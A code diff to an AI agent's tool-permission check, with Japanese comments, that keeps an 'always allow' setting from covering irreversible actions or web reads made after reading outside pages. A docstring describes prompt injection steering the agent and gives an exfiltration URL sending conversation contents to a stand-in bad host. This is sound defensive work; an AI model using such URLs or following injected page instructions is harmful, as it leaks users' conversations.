@@ -127,7 +127,30 @@ def level(tool: str) -> int:
 CHAIN_AFTER_EXTERNAL = {"web_read"}
 
 
-def needs_confirmation(tool: str, approval_mode: bool, external_reads: int = 0) -> bool:
+def may_always_allow(tool: str, external_reads: int = 0) -> bool:
+    """「この操作はいつも許可」を出してよい道具か。
+
+    出してはいけないのが2種類ある。
+
+    段階3（取り返せない）
+        毎回聞くことが、この段階の**中身そのもの**。1回押したら以後
+        メールが黙って飛ぶなら、段階を分けた意味が無くなる。
+
+    連鎖（外のページを読んだ後の web_read）
+        聞いている理由が「危なさ」ではなく「**誰が決めたか**」。行き先を
+        決めたのが本人ではなくページの本文かもしれない、という話なので、
+        道具ごとに一度許してよい性質の物ではない。
+        （`https://悪い所/?data=<会話の中身>` で持ち出せる）
+    """
+    if level(tool) >= 3:
+        return False
+    if external_reads > 0 and (tool or "").strip() in CHAIN_AFTER_EXTERNAL:
+        return False
+    return True
+
+
+def needs_confirmation(tool: str, approval_mode: bool, external_reads: int = 0,
+                       allowed=()) -> bool:
     """実行の前に人に聞くべきか。
 
     approval_mode は「確認しながら進める」設定。切っていても、
@@ -137,14 +160,22 @@ def needs_confirmation(tool: str, approval_mode: bool, external_reads: int = 0) 
     external_reads は、この用事の中でこれまでに外のページを読んだ回数。
     1回でも読んでいれば、そこから先の指示はページ由来かもしれないので、
     連鎖しうる道具（CHAIN_AFTER_EXTERNAL）には確認を挟む。
+
+    allowed は、本人が「いつも許可」を押した道具の名前。**上の2つは
+    ここに入っていても効かない**——効かせてよい物だけを may_always_allow
+    が決めていて、ここでも同じ関門をもう一度通す（画面側の作りが変わっても
+    サーバー側が守る）。
     """
     lv = level(tool)
     if lv >= 3:
         return True
-    if lv >= 2:
-        return bool(approval_mode)
-    if external_reads > 0 and (tool or "").strip() in CHAIN_AFTER_EXTERNAL:
+    name = (tool or "").strip()
+    if external_reads > 0 and name in CHAIN_AFTER_EXTERNAL:
         return True
+    if lv >= 2:
+        if name in set(allowed or ()):
+            return False
+        return bool(approval_mode)
     return False
 
 
@@ -169,6 +200,7 @@ def describe(tool: str, external_reads: int = 0) -> dict:
         "level": lv,
         "label": LABELS.get(lv, LABELS[UNKNOWN]),
         "always_confirm": lv >= 3,
+        "may_always": may_always_allow(tool, external_reads),
         "why": why,
         "chained": bool(chain),
     }
